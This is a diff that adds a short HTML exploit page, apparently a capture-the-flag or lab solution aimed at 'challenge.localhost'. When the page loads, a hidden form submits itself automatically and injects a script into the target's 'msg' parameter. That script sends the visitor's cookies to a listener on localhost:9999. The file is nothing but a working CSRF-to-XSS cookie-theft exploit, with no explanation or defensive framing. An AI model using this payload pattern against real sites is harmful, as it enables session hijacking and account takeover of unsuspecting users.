@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form id="csrf-form" action="http://challenge.localhost/ephemeral" method="GET">
+      <input type="hidden" name="msg" value="<script>fetch('http://localhost:9999', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain', 'Content-Length': document.cookie.length } });</script>">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
